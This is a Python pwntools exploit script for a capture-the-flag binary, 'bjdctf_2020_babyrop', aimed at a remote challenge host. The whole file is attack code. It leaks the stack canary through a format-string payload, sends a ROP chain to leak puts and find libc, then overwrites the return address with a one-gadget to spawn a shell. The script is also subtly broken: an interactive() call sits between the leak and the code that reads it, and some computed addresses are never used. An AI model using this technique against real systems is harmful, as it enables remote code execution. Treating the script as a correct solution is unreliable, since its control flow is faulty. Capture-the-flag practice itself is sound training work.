from pwn import *

r = remote('node3.buuoj.cn',26509)
elf = ELF('./bjdctf_2020_babyrop')
libc = ELF('./libc-2.23.so')
vuln = elf.symbols['vuln']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

payload1="%7$p"

r.recvuntil('u!\n')
r.sendline(payload1)
canary = eval(r.recvuntil("\n",drop=True))
log.success('[*]canary:'+hex(canary))

pop_rdi_ret = 0x400993

payload = 'a'*0x18+p64(canary)+'a'*8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)

r.recvuntil('story!\n')
r.sendline(payload)
r.interactive()
leak = u64(r.recvuntil('\n',drop=True).ljust(8,"\x00"))
libc_base = leak - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + libc.search("/bin/sh").next()
one = libc_base + 0xf02a4
payload = 'a'*0x18+p64(canary)+'a'*8+p64(one)+'\x00'*0x300
r.recvuntil('story!\n')
r.sendline(payload)
r.interactive()